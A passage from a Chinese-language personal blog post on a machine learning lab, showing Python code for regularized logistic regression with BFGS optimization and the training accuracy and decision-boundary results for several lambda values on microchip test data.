<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ====== 3.使用优化函数来优化求解 ======</span></span><br><span class="line"></span><br><span class="line">initial_theta = np.zeros(X.shape[<span class="number">1</span>])</span><br><span class="line">lmd = <span class="number">1</span> <span class="comment"># 设置λ非零</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost_func</span>(<span class="params">t</span>):</span></span><br><span class="line">    <span class="keyword">return</span> cost_Function_Reg(X, y,t, lmd)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grad_func</span>(<span class="params">t</span>):</span></span><br><span class="line">    <span class="keyword">return</span> cost_Function_Reg(X, y,t, lmd)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">theta, cost, *unused = opt.fmin_bfgs(f=cost_func, fprime=grad_func, x0=initial_theta, maxiter=<span class="number">400</span>, full_output=<span class="literal">True</span>, disp=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Plotting decision boundary ...&#x27;</span>)</span><br><span class="line">pdb.plot_Decision_Boundary( X, y,theta)</span><br><span class="line">plt.title(<span class="string">&#x27;lambda = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(lmd))</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Microchip Test 1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Microchip Test 2&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line">p = predict.predict( X,theta)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Train Accuracy: &#123;:0.4f&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(y == p) * <span class="number">100</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Expected accuracy (with lambda = 1): 83.1 (approx)&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>绘图结果：</p>
<img src="/2022/05/08/Machine-Learning-Lab2/1651944029693-1652006204970.png" class width="1651944029693"> 
<h2 id="Plotting-the-decision-boundary（绘制决策边界）"><a href="#Plotting-the-decision-boundary（绘制决策边界）" class="headerlink" title="Plotting the decision boundary（绘制决策边界）"></a>Plotting the decision boundary（绘制决策边界）</h2><p>在本部分中，我们需要绘制出决策边界，您将尝试 lambda 的不同值，查看正则化如何影响决策边界</p>
<ul>
<li>尝试以下 lambda 值（0、5、10、100）</li>
<li>观察决策边界图形的不同</li>
<li>查看训练集的准确度是否各不相同</li>
</ul>
<p>实验1，lambda = 0：</p>
<img src="/2022/05/08/Machine-Learning-Lab2/1651944333152-1652006204970.png" class width="1651944333152"> 
<ul>
<li>Train Accuracy: 88.1356</li>
</ul>
<p>实验2，lambda = 5：</p>
  <img src="/2022/05/08/Machine-Learning-Lab2/1651944624561-1652006204970.png" class width="1651944624561"> 
<ul>
<li>Train Accuracy: 80.5085</li>
</ul>
<p>实验3，lambda = 10：</p>
<img src="/2022/05/08/Machine-Learning-Lab2/1651944667097-1652006204970.png" class width="1651944667097"> 
<ul>
<li>Train Accuracy: 68.6441</li>
</ul>
<p>实验4，lambda = 100：</p>
<img src="/2022/05/08/Machine-Learning-Lab2/1651944713824-1652006204970.png" class width="1651944713824"> 
<ul>
<li>Train Accuracy: 61.0169</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/23/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><span class="page-number current">24</span><a class="page-number" href="/page/25/">25</a><span class="space">&hellip;</span><a class="page-number" href="/page/33/">33</a><a class="extend next" rel="next" href="/page/25/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">329</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:32</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
